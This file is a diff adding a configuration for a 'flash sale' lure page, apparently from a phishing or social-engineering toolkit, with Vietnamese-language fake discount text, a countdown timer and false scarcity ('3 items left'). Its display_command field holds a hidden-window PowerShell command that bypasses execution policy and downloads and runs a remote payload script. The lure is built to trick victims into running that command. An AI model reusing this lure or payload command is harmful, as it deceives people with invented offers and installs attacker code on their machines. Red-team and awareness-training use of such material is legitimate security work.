@@ -1,0 +1,28 @@
+# Flash Sale Lure
+# E-commerce flash sale with countdown timer
+
+type: flash_sale
+template: lures/flash_sale.html
+route: /giam-gia-soc
+
+payload:
+  script: "default.js"
+
+content:
+  headline: "⚡ KHUYẾN MÃI SỐC ⚡"
+  subheadline: "GIẢM 70% — Chỉ có hôm nay!"
+  product_name: "Gói Premium Cao Cấp"
+  original_price: "2.999.000 VNĐ"
+  sale_price: "899.000 VNĐ"
+  discount_badge: "TIẾT KIỆM 70%"
+  countdown_minutes: 15
+  countdown_seconds: 0
+  urgency_text: "Kết thúc sau:"
+  items_remaining: 3
+  guarantee_text: "Bảo đảm hoàn tiền trong 30 ngày"
+  checkout_button: "Mua Ngay — GIẢM 70%"
+  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""
+
+styles:
+  theme: "ecommerce"
+  primary_color: "#e74c3c"
